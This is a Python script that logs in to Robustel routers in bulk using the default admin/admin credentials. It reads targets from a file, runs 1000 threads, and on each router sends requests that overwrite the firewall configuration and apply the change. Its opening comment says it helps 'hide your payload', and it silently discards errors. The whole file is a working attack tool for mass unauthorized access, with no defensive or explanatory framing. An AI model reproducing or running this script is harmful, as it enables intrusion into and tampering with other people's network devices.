# this script is used to remove device configuration 
# it helps hide your payload

import requests
from concurrent.futures import ThreadPoolExecutor

def send_request(ip_port):
    url_login = f"http://{ip_port}/action/weblogin"

    headers_login = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    data_login = {
        "username": "admin",
        "password": "admin",
        "language": "english",
        "submit": "LOGIN",
    }

    try:
        # Perform login
        response_login = requests.post(url_login, headers=headers_login, data=data_login, timeout=18, verify=False, allow_redirects=False)

        # Check if the response status code is 302 (Redirect)
        if response_login.status_code == 302:
            print(f"[ROBUSTEL] logged in: {ip_port}")

            # Extract session cookie value
            cookie_value = response_login.headers.get('Set-Cookie', '').split('-goahead-session-=::webs.session::')[1].split(';')[0].strip()

            # Send additional requests after successful login
            send_post_login_request(ip_port, cookie_value)
            send_third_request(ip_port, cookie_value)

    except:
        pass  # Do nothing if an error occurs

def send_post_login_request(ip_port, cookie_value):
    url_post_login = f"http://{ip_port}/ajax/webs_uci_set/"

    headers_post_login = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
        "Cookie": f"-goahead-session-=::webs.session::{cookie_value}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    # Construct the XML data dynamically
    xml_data = """
    <?xml version="1.0" encoding="utf-8"?>
    <config_xml>
        <firewall>
            <custom_list>
                <id>0</id>
            </custom_list>
        </firewall>
    </config_xml>
    """

    data_post_login = {
        "setmsg": xml_data,
        "hash": f"::webs.session::{cookie_value}",
    }

    try:
        response_post_login = requests.post(url_post_login, headers=headers_post_login, data=data_post_login, timeout=18, verify=False)

        # Check if the request was successful
        if response_post_login.ok and "OK" in response_post_login.text:
            # No print statement for the success message
            pass

    except:
        pass  # Do nothing if an error occurs

def send_third_request(ip_port, cookie_value):
    url_third_request = f"http://{ip_port}/ajax/save_apply/"

    headers_third_request = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
        "Cookie": f"-goahead-session-=::webs.session::{cookie_value}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    data_third_request = {
        "hash": f"::webs.session::{cookie_value}",
    }

    try:
        response_third_request = requests.post(url_third_request, headers=headers_third_request, data=data_third_request, timeout=18, verify=False)

        # Check if the response body contains "OK"
        if "OK" in response_third_request.text:
            print(f"[ROBUSTEL] removed configuration: {ip_port}")

    except:
        pass  # Do nothing if an error occurs

# Read IP:PORT from ips.txt
with open("ips.txt", "r") as file:
    ip_ports = [line.strip() for line in file]

# Use ThreadPoolExecutor for concurrent processing
with ThreadPoolExecutor(max_workers=1000) as executor:
    executor.map(send_request, ip_ports)
